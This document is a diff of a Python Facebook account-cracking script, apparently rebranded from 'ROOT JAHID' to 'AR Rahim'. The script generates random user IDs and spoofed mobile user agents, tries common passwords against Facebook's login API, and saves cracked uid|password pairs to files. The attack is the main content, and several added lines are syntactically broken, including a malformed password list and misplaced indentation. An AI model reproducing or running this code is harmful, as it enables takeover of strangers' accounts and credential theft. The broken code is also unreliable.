@@ -169,7 +169,7 @@ for xd in range(10000):
   uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
   ugen.append(uakuh)
 for xd in range(5000):   
-   aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+	aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-','Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -178,7 +178,7 @@ for xd in range(5000):
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
-   j=random.randrange(4200,4900)
+j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
@@ -213,7 +213,7 @@ for xd in range(10000):
    k='Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)
-
+   
    aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
@@ -228,8 +228,8 @@ for xd in range(10000):
    l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
-
-for agenku in range(10000):
+   
+   for agenku in range(10000):
   a='Mozilla/5.0 (Linux; Android'
   b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
   c=random.choice(['M2006C3MII'])
@@ -290,7 +290,7 @@ for xd in range(10000):
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
-for xd in range(10000):	
+   for xd in range(10000):	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['M2012K11AG Build/'])
@@ -335,9 +335,9 @@ for xd in range(10000):
    l='JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
-
-os.system('xdg-open https://t.me/ROOTJAHIDX')
-os.system('xdg-open https://t.me/ROOTJAHIDX')
+	
+os.system('xdg-open https://t.me/rahimking2034')
+os.system('xdg-open https://t.me/rahimking2034')
 
 def linex():
     print(f'\r\33[38;5;37mтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБ')
@@ -364,37 +364,42 @@ logo = f"""
 def clear():
     os.system('clear')
     print(logo)
-
-
-
-def linex():print(f'\r\33[38;5;37mтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБ')
+    
+    
+    
+    def linex():print(f'\r\33[38;5;37mтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБ')
 def line():print(f'\r\n\33[38;5;37mтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБ')
 
 os.system('clear')
 
 # тЬЕ Main Function (Runs after successful login)
-os.system('espeak -a 300 "well,come to,Root Jahid tools"')
+os.system('espeak -a 300 "well,come to,AR Rahim tools"')
 logo = f"""
 \033[0;92m
-    тЦСтЦИтЦИтЦИтЦИтЦИ    тЦСтЦИтЦИтЦИ    тЦСтЦИтЦИ     тЦСтЦИтЦИ тЦСтЦИтЦИтЦИтЦИтЦИтЦИтЦСтЦИтЦИтЦИтЦИтЦИтЦИтЦИ   
-      тЦСтЦИтЦИ    тЦСтЦИтЦИтЦСтЦИтЦИ   тЦСтЦИтЦИ     тЦСтЦИтЦИ   тЦСтЦИтЦИ  тЦСтЦИтЦИ   тЦСтЦИтЦИ  
-      тЦСтЦИтЦИ   тЦСтЦИтЦИ  тЦСтЦИтЦИ  тЦСтЦИтЦИ     тЦСтЦИтЦИ   тЦСтЦИтЦИ  тЦСтЦИтЦИ    тЦСтЦИтЦИ 
-      тЦСтЦИтЦИ  тЦСтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИ тЦСтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИтЦИ   тЦСтЦИтЦИ  тЦСтЦИтЦИ    тЦСтЦИтЦИ 
-тЦСтЦИтЦИ   тЦСтЦИтЦИ  тЦСтЦИтЦИ    тЦСтЦИтЦИ тЦСтЦИтЦИ     тЦСтЦИтЦИ   тЦСтЦИтЦИ  тЦСтЦИтЦИ    тЦСтЦИтЦИ 
-тЦСтЦИтЦИ   тЦСтЦИтЦИ  тЦСтЦИтЦИ    тЦСтЦИтЦИ тЦСтЦИтЦИ     тЦСтЦИтЦИ   тЦСтЦИтЦИ  тЦСтЦИтЦИ   тЦСтЦИтЦИ  
- тЦСтЦИтЦИтЦИтЦИтЦИтЦИ   тЦСтЦИтЦИ    тЦСтЦИтЦИ тЦСтЦИтЦИ     тЦСтЦИтЦИ тЦСтЦИтЦИтЦИтЦИтЦИтЦИтЦСтЦИтЦИтЦИтЦИтЦИтЦИтЦИ   
-                                                    
-                                                    
-                                                    
+     .!!!!!:.                        .:!!!!!!!!!!!!
+  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
+      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
+      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
+      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
+      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
+        "*$bd$$$$      '*$$$$$$$$$$$o+#"
+             """"          """""""
+                  _____       _     _
+     /\          |  __ \     | |   (_)
+    /  \   _ __  | |__) |__ _| |__  _ _ __ ___
+   / /\ \ | '__| |  _  // _` | '_ \| | '_ ` _ \
+  / ____ \| |    | | \ \ (_| | | | | | | | | | |
+ /_/    \_\_|    |_|  \_\__,_|_| |_|_|_| |_| |_|
+                                                                                           
 \033[0;92m               \033[0;92m
 
 \33[0;41m       WORKING WIFI AND MOBILE DATA  \033[0;92m
 
 \33[38;5;37mтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБ
-\33[38;5;160m[\033[1;97mтЬФя╕П\33[38;5;160m] \033[1;97mTELEGRAM   \33[38;5;160mтЦ╢  \033[1;97m ROOT JAHID
-\33[38;5;160m[\033[1;97mтЬФя╕П\33[38;5;160m] \033[1;97mGITHUB    \33[38;5;160mтЦ╢  \033[1;97mROOT JAHID XPLOIT
+\33[38;5;160m[\033[1;97mтЬФя╕П\33[38;5;160m] \033[1;97mTELEGRAM   \33[38;5;160mтЦ╢  \033[1;97m AR Rahim
+\33[38;5;160m[\033[1;97mтЬФя╕П\33[38;5;160m] \033[1;97mGITHUB    \33[38;5;160mтЦ╢  \033[1;97mAR Rahim (M.sc)
 \33[38;5;160m[\033[1;97mтЬФя╕П\33[38;5;160m] \033[1;97mFEATURE    \33[38;5;160mтЦ╢  \033[1;97mOLD CLONE 
-\33[38;5;160m[\033[1;97mтЬФя╕П\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160mтЦ╢  \033[1;97m2.0
+\33[38;5;160m[\033[1;97mтЬФя╕П\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160mтЦ╢  \033[1;97m11.2.0
 \33[38;5;37mтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБтФБ"""
 
 def clear():
@@ -437,7 +442,7 @@ def __Old1__():
         linex()
         for mal in user:
         	uid=year_code+mal
-        	jihad.submit(login1,uid)
+        	rahim.submit(login1,uid)
         
 def __Old1__():
     user=[]
@@ -460,7 +465,7 @@ def __Old1__():
     line();print(f'\r\33[38;5;160m[\033[1;97mспд\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mспд\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160mтЦ╢ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mспд\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
 def __Old2__():
-    user=[]
+user=[]
     clear()
     print(f'\33[38;5;160m[\033[1;97mспд\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  тЦ╢ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
     linex()
@@ -469,7 +474,7 @@ def __Old2__():
     year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=30) as jihad:
+    with tred(max_workers=30) as rahim:
         clear()
         print(f'\33[38;5;160m[\033[1;97mспд\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160mтЦ╢ \033[1;97m{limit}')
         print(f'\33[38;5;160m[\033[1;97mспд\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
@@ -480,7 +485,7 @@ def __Old2__():
     line();print(f'\r\33[38;5;160m[\033[1;97mспд\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mспд\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160mтЦ╢ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mспд\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
 def __Old3__():
-    user=[]
+	user=[]
     clear()
     print(f'\33[38;5;160m[\033[1;97mспд\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  тЦ╢\033[1;97m 10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
     linex()
@@ -551,8 +556,8 @@ def login1(uid):
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/ROOT JAHID-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahim\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/AR Rahim-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -562,7 +567,7 @@ def login2(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\33[38;5;37m-\x1b[38;5;46mB2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahim\33[38;5;37m-\x1b[38;5;46mB2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
@@ -607,19 +612,18 @@ def login2(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHIDm\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/ROOT JAHID-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahimm\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/AR Rahim-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/ROOT JAHID-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahim\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/AR Rahim-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
         loop+=1
-    except Exception as e:time.sleep(30)
-def login3(uid):
+        def login3(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
@@ -627,7 +631,7 @@ def login3(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","11223344"987654321","1234567","87654321","12345678","123456789","111222",loveyou","fuckyou","kiss you","missyou","love you","Love You","Miss You"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -668,13 +672,13 @@ def login3(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/ROOT JAHID-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahim\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/AR Rahim-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/ROOT JAHID-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahim\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/AR Rahim-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -684,14 +688,14 @@ def login4(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMEHEDI\33[38;5;37m-\x1b[38;5;46mS4\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahim\33[38;5;37m-\x1b[38;5;46mS4\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
         for pw in ["123456","1234567","12345678","123456789","111222"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
-            'device_id':str(uuid.uuid4()),
+	         'device_id':str(uuid.uuid4()),
             'cpl': 'true',
             'family_device_id':str(uuid.uuid4()),
             'credentials_type': 'device_based_login_password', 
@@ -729,17 +733,17 @@ def login4(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/ROOT JAHID-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahim\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/AR Rahim-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mROOT JAHID\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/ROOT JAHID-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mAR Rahim\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mтЧП \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/AR Rahim-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
         loop+=1
     except Exception as e:time.sleep(30)
 main()
-#END ROOT JAHID
+#END AR Rahim 
